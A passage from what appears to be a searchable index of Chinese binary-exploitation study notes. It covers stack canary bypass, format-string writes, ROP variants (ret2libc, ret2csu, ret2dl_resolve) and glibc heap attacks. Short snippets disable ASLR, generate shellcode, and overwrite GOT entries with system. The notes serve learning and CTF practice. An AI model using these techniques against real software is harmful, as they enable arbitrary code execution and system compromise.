\uff0c\u522b\u614c\uff0c\u628a\u7a0b\u5e8f\u8fd0\u884c\u8d77\u6765\u518d\u65ad\u5c31\u597d\u3002 \u5b9e\u7528\u5c0f\u77e5\u8bc6\uff1a \u00b6 libc\u4e2d\u5b58\u50a8\u4e86main\u51fd\u6570environ\u6307\u9488\u7684\u5730\u5740\uff0c\u901a\u8fc7\u8be5\u6307\u9488\u53ef\u4ee5\u627e\u5230main\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5b58\u7684\u5730\u65b9A\uff08\u5728\u6808\u4e0a\uff09\uff0c\u5373\u901a\u8fc7environ\u6cc4\u6f0f\u6808\u5730\u5740\uff1a &environ\u662f\u53d7libc_base\u5f71\u54cd\u7684\u5730\u5740\u3002A=environ-0x1e*8 \u5173\u95ed\u7cfb\u7edfASLR\uff1aecho 0 > /proc/sys/kernel/randomize_va_space \u5f00\u542fgdb PIE\uff1aset disable-randomization off ASLR\u53d6\u503c\u89e3\u91ca\uff1a 0\uff1a\u6240\u6709\u968f\u673a\u5316\u5173\u95ed 1\uff1a\u9664\u5806\u4ee5\u5916\uff0c\u6240\u6709\u968f\u673a\u5316\u5f00\u542f\uff08\u5305\u62ec\u7a0b\u5e8f\u4ee3\u7801\u3001\u6808\u3001\u52a8\u6001\u5e93\u5730\u5740\uff09\u3002\u5806\u5730\u5740\u867d\u7136\u4e5f\u968f\u7a0b\u5e8f\u4ee3\u7801\u800c\u52a8\u6001\u53d8\u5316\uff0c\u4f46\u662f\u5806\u662f\u7d27\u8ddf\u5728\u7a0b\u5e8f\u90e8\u5206\u540e\u9762\u7684\uff0c\u968f\u7a0b\u5e8f\u4ee3\u7801\u57fa\u5740\u53d8\u5316\u3002 2\uff1a\u6240\u6709\u968f\u673a\u5316\u5f00\u542f\uff0c\u5806\u5730\u5740\u4e5f\u968f\u673a\uff0c\u4e0d\u80fd\u901a\u8fc7\u7a0b\u5e8f\u4ee3\u7801\u57fa\u5740\u63a8\u51fa\u3002 \u51fa\u9898\uff0c\u5f00\u542f\u9632\u62a4\u7684\u65b9\u6cd5\uff1a https://www.cnblogs.com/Spider-spiders/p/8798628.html \u79fb\u9664.symtab \u7b26\u53f7\u8868 \u4ee5\u53ca .strtab \u7b26\u53f7\u5b57\u7b26\u4e32\u8868 strip --remove-section=.symtab file_in strip --remove-section=.strtab file_in \u5728main\u51fd\u6570\u524d\u4f1a\u8c03\u7528.init\u6bb5\u4ee3\u7801\u548c.init_array\u6bb5\u7684\u51fd\u6570\u6570\u7ec4\u4e2d\u6bcf\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u3002\u540c\u6837\u7684\uff0cmain\u51fd\u6570\u7ed3\u675f\u540e\u4e5f\u4f1a\u8c03\u7528.fini\u6bb5\u4ee3\u7801\u548c.fini._arrary\u6bb5\u7684\u51fd\u6570\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u3002 \u7ed9\u7a0b\u5e8f\u4f20\u53c2\u6570\uff0cprocess(argv=[]) patchelf\u4f7f\u7528\u65b9\u6cd5\uff1a \u6539ld.so\u65f6\uff0cpatchelf --set-interpreter ld.so elfname\uff1b \u6539libc\u65f6\uff0cpatchelf --set-rpath libc elfname","title":"Pwn\u5b66\u4e60"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#canary","text":"","title":"canary"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#canary_1","text":"\u6cc4\u9732canary: canary\u4ee5\\x00\u7ed3\u5c3e\uff0c\u9700\u8981\u8986\u76d6\u6389\\x00\uff0c\u6cc4\u9732\u51facanary\uff0c\u7136\u540e\u518d\u6267\u884c\u6ea2\u51fa\u63a7\u5236\u8fd0\u884c\u8fc7\u7a0b\u3002","title":"canary\u7ed5\u8fc7\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#__stack_chk_failed","text":"\u5df2\u77e5 Canary \u5931\u8d25\u7684\u5904\u7406\u903b\u8f91\u4f1a\u8fdb\u5165\u5230 __stack_chk_failed \u51fd\u6570\uff0c\u4fee\u6539GOT\u8868\u3002","title":"\u52ab\u6301\uff1a__stack_chk_failed\u51fd\u6570\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#canaryssp-leak","text":"__stack_chk_failed\u51fd\u6570\u4e2d\u4f1a\u8f93\u51faargv[0]\uff0c\u53ef\u6784\u9020\u8db3\u591f\u957f\u7684\u5b57\u7b26\u4e32\u8986\u76d6\u6389argv[0]\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u5730\u5740\u3002\uff08\u8be6\u89c1\u9644\u5f55\uff09 \u9644\u5f55\uff1a https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/","title":"\u6545\u610f\u89e6\u53d1canary\uff08SSP leak\uff09\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_1","text":"","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_2","text":"n$:\u83b7\u53d6\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u6307\u5b9a\u53c2\u6570 hh:\u4e00\u4e2a\u5b57\u8282 h:\u53cc\u5b57\u8282 %p:\u5341\u516d\u8fdb\u5236\u5730\u5740\u683c\u5f0f\u6253\u5370\u53d8\u91cf\u7684\u503c %n:\u4e0d\u8f93\u51fa\uff0c\u628a\u5df2\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf %%:\u8f93\u51fa\u4e00\u4e2a%","title":"\u57fa\u672c\u77e5\u8bc6\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_3","text":"\u7528:[tag]%p%p%p%p%p%p... \u6765\u6d4b\u8bd5\u9700\u8981\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff08\u6076\u610f\uff09\u662f\u8f93\u51fa\u51fd\u6570\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570\u3002","title":"\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_4","text":"...[overwrite addr]....%[overwrite offset]$n \u627e\u5230\u5730\u5740\uff0c\u7136\u540e\u786e\u5b9a\u8be5\u5730\u5740\u662f\u7b2c\u51e0\u4e2a\u53c2\u6570\u3002 \u8986\u76d6\u5c0f\u6570\u5b57\uff1a\u524d\u9762\u653epadding\uff0c\u8981\u8986\u76d6\u7684\u5730\u5740\u653e\u5728\u540e\u9762\u3002 \u8986\u76d6\u5927\u6570\u5b57\uff1a\u4f7f\u7528%hhn\u622a\u65ad\uff0c\u6309\u6bcf\u4e2a\u5b57\u8282\u5199\u5165","title":"\u8986\u76d6\u5185\u5b58\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#hijack-got","text":"\u786e\u5b9a\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\uff0c\u786e\u5b9a\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\uff0c\u5c06\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u5904\u3002 Pwntools\u7684fmtstr_payload\u51fd\u6570\uff0c\u4f8b\u5982\uff1afmtstr_payload(7, {puts_got: system_addr}) \u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f 7\uff0c\u6211\u5e0c\u671b\u5728 puts_got \u5730\u5740\u5904\u5199\u5165 system_addr \u8fd9\u4e2a\u6570\u636e\u3002","title":"Hijack GOT:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#hijack-retaddr","text":"\u76f4\u63a5\u4fee\u6539\u4e3a\u60f3\u8981\u8df3\u8f6c\u7684\u5730\u5740\u3002","title":"Hijack Retaddr\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_5","text":"","title":"\u6808\u6ea2\u51fa"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_6","text":"1\u3001\u5c40\u90e8\u53d8\u91cf\u548c\u5168\u5c40\u53d8\u91cf\u90fd\u662f\u5148\u5b9a\u4e49\u7684\u5728\u4f4e\u5730\u5740\uff0c\u540e\u5b9a\u4e49\u7684\u5728\u9ad8\u5730\u5740\u3002 2\u3001ELF\u7f16\u8bd1\u65f6\u52a0\u4e86PIE\u9009\u9879\u540e\u4e3aso\u6587\u4ef6 3\u3001plt\u8868\u5b58got\u8868\u9879\u5730\u5740\uff0cgot\u8868\u5b58\u7684\u662f\u771f\u6b63\u7684\u51fd\u6570\u5730\u5740\uff08\u5728\u672a\u8c03\u7528\u8fc7\u4e00\u6b21\u51fd\u6570\u524d\uff0cgot\u8868\u5b58\u7684\u662fplt\u8868\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740\uff0c\u8c03\u7528\u8fc7\u4e00\u6b21\u4e4b\u540e\u624d\u662f\u771f\u6b63\u51fd\u6570\u5730\u5740\uff09\u3002plt\u8868\u5728\u4ee3\u7801\u6bb5\uff0cgot\u8868\u5728\u6570\u636e\u6bb5\uff0cplt\u8868\u53ef\u4ee5\u8df3\u5230got\u8868\u5730\u5740\u3002 4\u3001readelf -r ./filename\u67e5\u770bgot\u8868 5\u3001\u6539\u8868\u5185\u5bb9\u4e00\u822cGOT\u8868\uff0c\u6539\u8fd4\u56de\u5730\u5740\u6539\u4e3aPLT\u8868\u5730\u5740\u6216\u8005GOT\u8868\u5730\u5740\u90fd\u53ef\u4ee5\u3002 6\u3001libc\u4e2d\u627e\u201d/bin/sh\u201d\uff1alibc.search(\u2018/bin/sh\u2019).next() 7\u3001enter\u548cleave\u4e00\u7ec4\uff0ccall\u548cret\u4e00\u7ec4\u3002 call: push rip; jmp target; ret: pop rip enter: push rbp; mov rbp,rsp leave: mov rsp,rbp; pop rbp 8\u3001gets\u51fd\u6570\u9047\u5230\u56de\u8f66\u624d\u7ed3\u675f\uff0c\u56de\u8f66\u88ab\u81ea\u52a8\u8f6c\u6362\u6210\u2019\\0\u2019\u5b58\u5230\u5b57\u7b26\u4e32\u3002read\u51fd\u6570\u65e00\u622a\u65ad\u3002 9\u3001gdb\u9ed8\u8ba4\u5173\u95edASLR\uff0c\u8981\u5f00\u542f\u9700\u8981\uff1aset disable-randomization off","title":"\u57fa\u672c\u77e5\u8bc6\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#ret2text","text":"\u76f4\u63a5\u6ea2\u51fa\u6539\u8fd4\u56de\u5730\u5740","title":"ret2text:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#ret2shellcode","text":"vmmap\u67e5\u770b\u6bb5\u6267\u884c\u6743\u9650\uff0c\u4f8b\u5982bss\u6bb5\u3002\u628ashellcode\u653e\u5230bss\u6bb5\u4e2d\uff0c\u6539\u8fd4\u56de\u5730\u5740\u8df3\u8f6c\u5230shellcode\u3002 shellcode = asm(shellcraft.sh()) \u6ce8\u610f64\u4f4d\u8981\u4fee\u6539\uff1acontext.bits=64 ; context.arch='amd64'","title":"ret2shellcode:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#ret2syscall","text":"\u5229\u7528\u5982\u4e0b\u7cfb\u7edf\u8c03\u7528\u6765\u83b7\u53d6shell\u3002 execve(\"/bin/sh\",NULL,NULL) 32\u4f4d\u7cfb\u7edf\uff1aeax\u4e3a\u7cfb\u7edf\u8c03\u7528\u53f70xb\uff0cebx\u6307\u5411/bin/sh\u5730\u5740\uff0cecx\u3001edx\u4e3a0\u3002 \u7528ROPgadget\u627egadget\uff1a ROPgadget --binary filename --only \u2018pop|ret\u2019 |grep \u2018ebx\u2019 \u627e/bin/sh\u5730\u5740\uff1a ROPgadget --binary filename --string \u2018/bin/sh\u2019 \u627eint 0x80: ROPgadget --binary filename --only \u2018int\u2019 \u4ee5\u4e0a\u4e3a32\u4f4d\uff0c64\u4f4d\u7684\u4e0d\u540c\u4e4b\u5904\u9664\u4e86\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u4e4b\u5916\uff0c64\u4f4d\u5e76\u4e0d\u4f7f\u7528int 0x80\uff0c\u800c\u662f\u4f7f\u7528syscall\uff0c\u4e24\u8005\u673a\u5668\u7801\u5e76\u4e0d\u76f8\u540c\u3002 32\u4f4dexecve\u8c03\u7528\u53f7\u662f0xb\uff0c64\u4f4d\u662f0x3b\uff0c\u4e24\u8005\u90fd\u662f\u5b58\u5728eax(rax)\u5bc4\u5b58\u5668\u4e2d","title":"ret2syscall:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#ret2libc","text":"\u6cc4\u9732 __libc_start_main \u5730\u5740 \u83b7\u53d6 libc \u7248\u672c \u83b7\u53d6 system \u5730\u5740\u4e0e /bin/sh \u7684\u5730\u5740 \u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f \u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884c system(\u2018/bin/sh\u2019) Ret2libc3\u8981\u6ce8\u610f\u5f00\u59cb\u65f6\u628aesp\u8fdb\u884c\u4e86and\u64cd\u4f5c\uff0c\u6700\u4f4e4\u4f4d\u6e050","title":"ret2libc:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#ret2csu","text":"\u5229\u7528__libc_csu_init\u51fd\u6570\u4e2d\u7684gadgets\uff0c\u53ef\u4ee5\u63a7\u5236rbx,rbp,r12,r13,r14,r15\u7684\u6570\u636e\uff0c\u5176\u4e2d\u53ef\u4ee5\u901a\u8fc7r13,r14,r15\u63a7\u5236rdx,rsi,edi\u7684\u6570\u636e\uff0c\u901a\u8fc7rbx\u548cr12\u7684\u914d\u5408\u63a7\u5236\u8df3\u8f6c\u5230\u60f3\u8981\u7684\u51fd\u6570\u3002\u6ce8\u610f\u662fcall qword ptr [r12+rbx*8]\uff0c\u4f1a\u5148\u53d6\u5730\u5740\u5185\u5bb9\u518d\u8df3\u8f6c\uff0c\u6240\u4ee5\u4e0d\u80fd\u586bplt\u8868\u800c\u5e94\u8be5\u662fgot\u8868\u3002 \u63a7\u5236rbx+1=rbp\uff0c\u5219\u4e0d\u4f1a\u8df3\u8f6c\uff0c\u8fdb\u884c\u987a\u5e8f\u6267\u884c\u3002\u4f46\u662f\u8981\u6ce8\u610f\u4f1a\u4e00\u76f4\u6267\u884c\u5230retn\uff0c\u6240\u4ee5\u8981\u6784\u9020padding\u957f\u5ea6\u4e3a0x38\u7528\u6765pop\u3002 libc_csu_init\u7684\u5c3e\u90e8\u53ef\u4ee5\u901a\u8fc7\u504f\u79fb\uff0c\u8fd8\u80fd\u63a7\u5236rbp\u548crsi\u5bc4\u5b58\u5668\u3002","title":"ret2csu:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#ret2dl_resolve","text":"\u53c2\u8003\uff1a http://pwn4.fun/2016/11/09/Return-to-dl-resolve/\uff1b http://rk700.github.io/2015/08/09/return-to-dl-resolve/ \uff08\u8fd9\u4e2a\u6ca1\u770b\uff0c\u6709\u7a7a\u770b\u770b\uff09 Stage1\uff1a\u666e\u901aROP Stage2\uff1a\u63a7\u5236\u8fd4\u56de\u5730\u5740\u4e3aplt[0]\uff0c\u7136\u540e\u6267\u884cpush GOT 1 \uff0cjmp GOT[2]\uff0c\u8c03\u7528_dl_runtime_resolve(linkmap,reloc_arg)\uff0c\u76f8\u5f53\u4e8e\u4eba\u4e3a\u8df3\u8fc7\u4e86PLT\u8868\u9879\u5f00\u59cb\u65f6\u90a3\u90e8\u5206\u64cd\u4f5c\uff08\u5c31\u662f\u8c03\u7528\u51fd\u6570\u5230PLT\u65f6\u6709\u4e09\u90e8\u5206\u64cd\u4f5c\u561b\uff0cJMP\u3001PUSH\u3001JMP\uff0c\u7136\u540e\u8fd9\u4e2a\u7684\u505a\u6cd5\u5c31\u662f\u8df3\u8fc7\u4e86\u7b2c\u4e00\u4e2aJMP\uff0c\u624b\u52a8PUSH\u504f\u79fb\uff0c\u7136\u540e\u7b2c\u4e09\u4e2aJMP\u5c31\u662f\u8df3\u5230PLT[0]\uff09 Stage3\uff1a\u5b9e\u9645\u4e0aStage2\u4e2dpush\u7684\u504f\u79fb\uff0c\u5c31\u662f\u76ee\u6807\u51fd\u6570\u5728.rel.plt\u8282\u4e2d\u7684\u504f\u79fb\u3002\u8fd9\u4e2astage\u4e2d\uff0c\u4f2a\u9020\u4e86write\u5728.rel.plt\u8282\u4e2d\u5bf9\u5e94\u7684\u8868\u9879\u3002\u8fd9\u4e2a\u8868\u9879\u6709\u4e24\u4e2a\u503c\uff0c\u7b2c\u4e00\u4e2a\u503c\u5bf9\u5e94\u7684\u662f\u51fd\u6570\u7684GOT\u8868\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u503cr->info\uff08\u4e0d\u662f\u5f88\u61c2\uff0c\u4f46\u662f\u5b83\u53f3\u79fb8\u4f4d\u5f97\u5230\u7684\u53eb\u7d22\u5f15\uff0c\u8fd9\u4e2a\u7d22\u5f15\u5bf9\u5e94\u7684\u662f.dynsym\u4e2d\u51fd\u6570\u6240\u5728\u7684\u7d22\u5f15\uff0c\u4f8b\u5982write\u7684\u503c\u662f0x607\uff0c\u53f3\u79fb8\u4f4d\u5f97\u5230\u7d22\u5f15\u5c31\u662f0x6\uff0c\u521a\u597d\u5bf9\u5e94\u5b83\u5728.dynsym\u4e2d\u7d22\u5f15\u662f6\u3002\u800c\u5b83\u76847\u4ee3\u8868\u7740\u5b83\u662fR_386_JUMP_SLOT\u8fd9\u4e2atype\uff09 Stage4\uff1a\u8fd9\u4e2astage\u4e2d\uff0c\u4f2a\u9020\u4e86\u51fd\u6570\u5728.dynsym\u8868\u4e2d\u7684\u9879\u3002\u5728stage3\u4e2d\u4f2a\u9020\u4e862\u4e2a\u503c\uff0c\u5176\u4e2d\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e8c\u4e2a\u503c\u627e\u5230\u51fd\u6570\u5728.dynsym\u4e2d\u7684\u7d22\u5f15\uff0c\u518d\u901a\u8fc7\u8fd9\u4e2a\u7d22\u5f15\u5bf9\u5e94\u7684\u8868\u9879A\uff0c\u53ef\u4ee5\u627e\u5230\u51fd\u6570\u5728.dynstr\u8868\u4e2d\u7684\u9879B\u3002\u8868\u9879A\u957f\u5ea6\u4e3a0x10\uff0c\u4f4e\u5730\u5740\u76844\u5b57\u8282\uff08st_name\uff09\u5b58\u7684\u662fB\u548c.dynstr\u8868\u5934\u7684\u504f\u79fb\u3002 Stage5\uff1a\u8fd9\u4e2astage\u548cstage4\u57fa\u672c\u5dee\u4e0d\u591a\uff0c\u8fd9\u4e2astage\u662f\u5728stage4\u7684\u57fa\u7840\u4e0a\u4f2a\u9020\u4e86.dynstr\u8868\u9879\u3002\u501f\u6b64\u6539\u53d8st_name\uff0c\u5f15\u5bfc\u5230\u81ea\u5df1\u5199\u7684\u51fd\u6570\u540d\u4e2d\uff0c\u672c\u4f8b\u662f\u201dwrite\\x00\u201d Stage6\uff1a\u548cstage5\u540c\u7406\uff0c\u5b9e\u6218\u3002\u628a\u5b57\u7b26\u4e32\u6539\u4e3a\u201dsystem\\x00\u201d\uff0c\u5373\u53ef\u89e3\u6790\u6210system\u51fd\u6570\u3002 \u9644\u5f55\uff1a roputils\u5de5\u5177\uff1a https://github.com/inaz2/roputils","title":"ret2dl_resolve:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_7","text":"","title":"\u5806"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#_8","text":"\u5f53\u8c03\u7528free\u51fd\u6570\u7684\u65f6\u5019 __free_hook \u4e0d\u4e3aNULL\u4f1a\u4f18\u5148\u8c03\u7528 __free_hook \u51fd\u6570\u52ab\u6301free\u51fd\u6570\u3002\u5f53GOT\u8868\u4e0d\u80fd\u4fee\u6539\u65f6\uff0c\u53ef\u8003\u8651\u4fee\u6539 __free_hook \u6307\u5411\u7684\u5185\u5bb9\u4e3a\u60f3\u8981\u7684\u51fd\u6570(\u5982system)\uff0c\u8981\u88ab\u91ca\u653e\u7684\u5806\u5730\u5740\u4e3a\u53c2\u6570\uff0c\u8fbe\u5230free(addr)=system(addr)\u7684\u6548\u679c\u3002\u4fee\u6539 __malloc_hook \u540e\uff0c\u53ef\u8003\u8651\u901a\u8fc7\u8fde\u7eed\u91ca\u653e\u540c\u4e00\u5806\u5757\uff08double free\uff09\u8fdb\u884c\u89e6\u53d1\uff0c\u7a0b\u5e8f\u4f1a\u62a5\u9519\uff0c\u4f46\u4f1a\u8c03\u7528backtrace_and_map\u51fd\u6570\u4e4b\u540e\u8c03\u7528malloc\u51fd\u6570\u3002 \u5806\u57fa\u7840\u5b66\u4e60\u8d44\u6599\uff1a https://www.cnblogs.com/alisecurity/p/5486458.html\uff0chttps://www.cnblogs.com/alisecurity/p/5520847.html chunk\u52a0\u5165unsorted bin\u7684\u60c5\u51b5\uff1a \u2460\u91ca\u653esmall chunk\u65f6\uff0c\u5982\u679c\u80fd\u8fdb\u884c\u5408\u5e76\uff0c\u5c31\u5c06\u80fd\u5408\u5e76\u7684\u4ecesmall bin\u4e2d\u79fb\u9664\uff0c\u5c06\u65b0\u7684chunk\u52a0\u5165\u5230unsorted bin\u4e2d\u3002\uff08large bin\u540c\u7406\uff09 \u2461\u5982\u679clarge bin\u6700\u5927chunk size\u5927\u4e8e\u7528\u6237\u8bf7\u6c42\u7684size\uff0c\u5219\u62c6\u5206\u4e3a\u4e24\u5757\uff0c\u524d\u8005\u7ed9\u7528\u6237\uff0c\u540e\u8005\u52a0\u5165\u5230unsorted bin\u3002 fast bin\uff1aLIFO \uff1b small bin\uff1a FIFO fast bin\u4f7f\u7528\u5355\u94fe\u8868\uff0c\u5176\u4ed6\u5faa\u73af\u53cc\u94fe\u8868 mmap\u5f97\u5230\u7684\u5730\u5740\u662f\u8ddflibc\u6709\u5173\u7684\uff0c\u53ef\u4ee5\u5728\u5173\u95edASLR\u7684\u65f6\u5019\u6c42\u504f\u79fb\u3002\u7136\u540e\u518d\u5229\u7528\u8fd9\u4e2a\u504f\u79fb\uff0c\u53ef\u4ee5\u5728\u5f00\u542fASLR\u7684\u65f6\u5019\u6c42\u5f97libc\u57fa\u5740\u3002 \u5411\u540e\u5408\u5e76\uff1a\u628a\u76f8\u90bb\u7684\u4f4e\u5730\u5740\u7684chunk\u5408\u5e76 32\u4f4d\u7cfb\u7edf\u4e2d\uff0c\u7528\u6237\u7684\u8bf7\u6c42\u572816bytes\u523064bytes\u4f1a\u88ab\u5206\u914d\u5230fastbin\u4e2d\uff1b64\u4f4d\u7cfb\u7edf\u4e2d\uff0c\u7528\u6237\u7684\u8bf7\u6c42\u572832bytes\u5230128bytes\u4f1a\u88ab\u5206\u914d\u5230fastbin\u4e2d \u4f2a\u9020fake chunk\u65f6\uff0c\u8981\u6ce8\u610f\u4f2a\u9020next chunk\u7684prev_size\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\uff08House of einherjar\u91cc\u9762\u6709\u8be6\u7ec6\u63d0\u5230\uff09 \u5f53\u7533\u8bf7\u7684\u5806\u5757\u5927\u4e8e\u5f53\u524d\u7684top chunk size\u4e14\u5c0f\u4e8e\u7528mmap\u5206\u914d\u7684\u9608\u503c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u5c06\u539f\u6765\u7684top chunk \u653e\u5230**unsorted bin**\u4e2d\uff0c\u540c\u65f6\u5206\u914d\u65b0\u7684\u8f83\u5927\u7684top chunk\u51fa\u6765\u3002","title":"\u57fa\u672c\u77e5\u8bc6\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#define-malloc_alignment-2-size_sz","text":"","title":"define MALLOC_ALIGNMENT       (2 * SIZE_SZ)"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#define-malloc_align_mask-malloc_alignment-1","text":"tcache_entry\u4e2d\uff0cnext\u57df\u76f4\u63a5\u6307\u5411user data\uff0c\u800c\u4e0d\u662f\u50cffastbin\u90a3\u6837\u6307\u5411chunk\u5f00\u5934 calloc\u4e0d\u4f1a\u5206\u914dtcache\u4e2d\u7684\u5806","title":"define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#unlink","text":"\u5728\u535a\u5ba2\u4e0a\u5199","title":"Unlink:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#uaf","text":"\u5806\u88ab\u91ca\u653e\uff0c\u4f46\u6307\u9488\u672a\u88ab\u7f6enull","title":"UAF\uff1a"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#fastbin-double-free","text":"\u901a\u8fc7\u6784\u9020\u51faA->B->A\u7684fastbin\uff0c\u7533\u8bf7A\uff0c\u4ece\u800c\u53ef\u4ee5\u4fee\u6539A\u7684fd\u57df\uff0c\u7b2c\u4e8c\u6b21\u518d\u7533\u8bf7A\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u4fee\u6539\u60f3\u8981\u7684\u5730\u5740\u3002\u8981\u6ce8\u610f\u5bf9size\u7684\u68c0\u67e5\uff0c\u9700\u8981\u7b26\u5408\u5f53\u524dbin\u7684size","title":"Fastbin double free:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#house-of-spirit","text":"\u4f2a\u9020\u5757\uff0cfree\u6389\u518d\u7533\u8bf7\uff0c\u4ece\u800c\u5b9e\u73b0\u5206\u914d\u5230\u7684\u5806\u5757\u662f\u6211\u4eec\u4f2a\u9020\u7684\u5806\u5757\u3002\u9700\u8981\u6ce8\u610fsize\u7b26\u5408\u8981\u6c42\uff0c\u5757\u5730\u5740\u5bf9\u9f50\uff0c ISMMAP \u4e0d\u80fd\u4e3a1","title":"House of spirit:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#chunk-overlap","text":"free\u6389\u4e00\u4e2aunsorted chunk A\uff0c\u8fd9\u6837\u5b83\u4e0b\u4e00\u4e2achunk B\uff08\u7269\u7406\u9ad8\u5730\u5740\u76f8\u90bb\uff09\u7684prev_size\u5c31\u662f\u8fd9\u4e2aA\u7684size \u628aA\u7684size\u6539\u5c0f\uff0c\u7136\u540e\u5206\u914d\u81f3\u5c11\u4e24\u6b21\uff08\u5047\u8bbe\u5206\u914d\u4e24\u6b21\uff0c\u628a\u539f\u6765\u7684A\u62c6\u5206\u5f97\u5230C\u548cD\uff09\uff0c\u7531\u4e8e\u6539\u5c0f\u4e86\uff0c\u56e0\u6b64\u5206\u914d\u65f6\u5e76\u4e0d\u4f1a\u5f71\u54cd\u5230B\u7684prev_size\u548csize\u7684prev_in_use\u4f4d\uff0c\u5f53\u7136\u8fd9\u91cc\u8981\u6ce8\u610f\u6784\u9020\u4e0bfake chunk\u9632\u6b62\u5206\u914dC\u65f6\u88abcheck free C\uff0cfree B\uff08\u5728free B\u7684\u65f6\u5019\uff0c\u56e0\u4e3aprev_size\u6ca1\u6709\u6539\u8fc7\uff0c\u8fd8\u662fA\u7684size\uff0c\u56e0\u6b64\u76f8\u5f53\u4e8e\u628aA\u548cB\u5408\u5e76\u8d77\u6765\u4e86\uff0c\u5f97\u5230E\uff09 E\u8fdb\u5165unsorted bin\uff0c\u4f46\u663e\u7136D\u4e5f\u5728E\u4e2d\uff0c\u5c31\u6709UAF\uff0c\u4e4b\u540e\u5c31\u5e38\u89c4\u5229\u7528\u4e86","title":"Chunk overlap:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#unsorted-bin-attack","text":"\u4e0d\u6ee1\u8db3fastsize\u7684chunk\u88abfree\u540e\u8fdb\u5165unsorted bin\uff0c\u5f53\u4eceunsorted bin\u4e2d\u53d6\u51fa\u4e00\u4e2achunk p\u65f6\uff0c\u4f1a\u628ap->bk->fd\u7f6e\u4e3a\u4e00\u4e2a\u5f88\u5927\u7684\u6570\uff08main_arena\u4e2d\u7684\u4e00\u4e2a\u5730\u5740\uff09\uff0c\u56e0\u6b64\u5982\u679c\u80fd\u6539bk\u5c31\u80fd\u628a\u67d0\u4e2a\u5730\u5740\u7684\u503c\u8bbe\u4e3a\u5f88\u5927\uff0c\u4e00\u822c\u53ef\u4ee5\u6539global_max_fast","title":"Unsorted bin attack:"},{"location":"Pwn\u5b66\u4e60\u7b14\u8bb0/pwn\u5b66\u4e60/#small-bin-attackhouse-of-lore","text":"\u5229\u7528\u6761\u4ef6\uff1a\u2460\u53ef\u4ee5\u63a7\u5236\u5728small bin\u4e2d\u7684chunk\u7684bk\u6307\u9488 